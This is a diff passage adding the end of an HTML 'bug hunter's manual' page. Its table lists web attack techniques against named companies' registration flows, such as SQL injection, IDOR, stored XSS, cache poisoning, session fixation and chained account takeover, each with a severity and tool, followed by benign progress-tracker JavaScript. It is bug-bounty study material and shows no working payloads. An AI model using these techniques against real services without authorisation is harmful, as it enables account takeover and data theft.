+        <tr><td>05</td><td>Mozilla Social — SQLi</td><td>Time-Based Sleep Inject</td><td style="color:#ff3355">CRITICAL</td><td>sqlmap / Burp</td></tr>
+        <tr><td>06</td><td>UPchieve — DoS</td><td>bcrypt Exhaustion</td><td style="color:#ffc233">MEDIUM</td><td>Burp + Payload</td></tr>
+        <tr><td>07</td><td>Mars/Royal Canin — IDOR</td><td>user_id Parameter Swap</td><td style="color:#ff7733">HIGH</td><td>Burp Intruder</td></tr>
+        <tr><td>08</td><td>Email Collision Deletion</td><td>DB Overwrite Logic</td><td style="color:#ff7733">HIGH</td><td>Manual</td></tr>
+        <tr><td>09</td><td>Salesforce Aura — BAC</td><td>Guest Profile API Access</td><td style="color:#ff3355">CRITICAL</td><td>Burp Suite</td></tr>
+        <tr><td>10</td><td>Acronis — XSS + CSRF</td><td>Stored XSS Chain Attack</td><td style="color:#ff3355">CRITICAL</td><td>Burp + XSS Payload</td></tr>
+        <tr><td>11</td><td>Instagram — Enumeration</td><td>Timing + Response Diff</td><td style="color:#ffc233">MEDIUM</td><td>Burp Repeater</td></tr>
+        <tr><td>12</td><td>Twitter — Resp. Manip.</td><td>Boolean Patching</td><td style="color:#ff7733">HIGH</td><td>Burp Intercept</td></tr>
+        <tr><td>13</td><td>Hacky Holidays — Flag 10</td><td>Scientific Notation 1e3</td><td style="color:#ffc233">MEDIUM</td><td>Manual Input</td></tr>
+        <tr><td>14</td><td>Abritel.fr — Cache Poison</td><td>Unkeyed Header + Cache</td><td style="color:#ff3355">CRITICAL</td><td>Burp + CDN Test</td></tr>
+        <tr><td>15</td><td>OAuth — Redirect Bypass</td><td>redirect_uri Manipulation</td><td style="color:#ff7733">HIGH</td><td>Burp + VPS</td></tr>
+        <tr><td>16</td><td>Google — Resp. Header</td><td>Internal IP Disclosure</td><td style="color:#ffc233">MEDIUM</td><td>Header Inspector</td></tr>
+        <tr><td>17</td><td>LinkedIn — Race Cond.</td><td>Single-Packet Turbo Attack</td><td style="color:#ff7733">HIGH</td><td>Turbo Intruder</td></tr>
+        <tr><td>18</td><td>Shopify — HPP</td><td>Double Email Parameters</td><td style="color:#ffc233">MEDIUM</td><td>Burp Repeater</td></tr>
+        <tr><td>19</td><td>Uber — Referer Leakage</td><td>Token in Referer Header</td><td style="color:#ff7733">HIGH</td><td>Burp Monitor</td></tr>
+        <tr><td>20</td><td>Slack — Weak Token</td><td>Token Entropy Analysis</td><td style="color:#ff7733">HIGH</td><td>CyberChef + Logic</td></tr>
+        <tr><td>21</td><td>Mail.ru — No Rate Limit</td><td>Mass Account Automation</td><td style="color:#ffc233">MEDIUM</td><td>Burp Intruder</td></tr>
+        <tr><td>22</td><td>GitLab — Domain Bypass</td><td>Email Alias / Case Trick</td><td style="color:#ffc233">MEDIUM</td><td>Manual</td></tr>
+        <tr><td>23</td><td>Airbnb — Phone Bypass</td><td>API Response Patching</td><td style="color:#ff7733">HIGH</td><td>Burp Intercept</td></tr>
+        <tr><td>24</td><td>Yahoo — Session Fix.</td><td>Pre-Login Session Fixation</td><td style="color:#ff7733">HIGH</td><td>Burp + Manual</td></tr>
+        <tr><td>25</td><td>Spotify — CSS Inject</td><td>UI Redressing / Phishing</td><td style="color:#ffc233">MEDIUM</td><td>CSS Payload</td></tr>
+        <tr><td>26</td><td>Dropbox — Hidden Fields</td><td>is_admin=1 Injection</td><td style="color:#ff3355">CRITICAL</td><td>Burp Repeater</td></tr>
+        <tr><td>27</td><td>Cloudflare — JSON Inject</td><td>Extra JSON Key Logic</td><td style="color:#ff7733">HIGH</td><td>Burp Suite</td></tr>
+        <tr><td>28</td><td>Valve — CAPTCHA Bypass</td><td>2captcha / Logic Bypass</td><td style="color:#ffc233">MEDIUM</td><td>2captcha API</td></tr>
+        <tr><td>29</td><td>Basecamp — Open Redirect</td><td>Post-Signup Redirect</td><td style="color:#ffc233">MEDIUM</td><td>Burp + Manual</td></tr>
+        <tr><td>30</td><td>Final CTF — Chain Attack</td><td>Enum + SQLi + IDOR = ATO</td><td style="color:#ff3355">CRITICAL</td><td>All Tools</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+</div><!-- /container -->
+
+<footer>
+  [ ELITE BUG HUNTER'S MANUAL ] · [ REGISTRATION FUNCTIONALITY ] · [ 30 HACKERONE REPORTS ] · [ 5 PHASES ] · [ ALL 25 TECHNIQUES ]<br>
+  <span style="color:#ff3355">AUTHORIZED SECURITY RESEARCH USE ONLY — NEVER TEST WITHOUT PERMISSION</span>
+</footer>
+
+<script>
+  // Toggle checkboxes
+  function toggleCheck(el) {
+    el.classList.toggle('done');
+    updateProgress();
+  }
+
+  function updateProgress() {
+    const total = document.querySelectorAll('.check-box').length;
+    const done = document.querySelectorAll('.check-box.done').length;
+    document.getElementById('prog-count').textContent = done;
+    document.getElementById('prog-fill').style.width = (done / total * 100) + '%';
+  }
+
+  // Scroll reveal
+  const cards = document.querySelectorAll('.card');
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach((e, i) => {
+      if (e.isIntersecting) {
+        setTimeout(() => e.target.classList.add('visible'), 80 * (Array.from(cards).indexOf(e.target) % 3));
+        observer.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.1 });
+  cards.forEach(c => observer.observe(c));
+
+  updateProgress();
+</script>
+
+</body>
+</html>
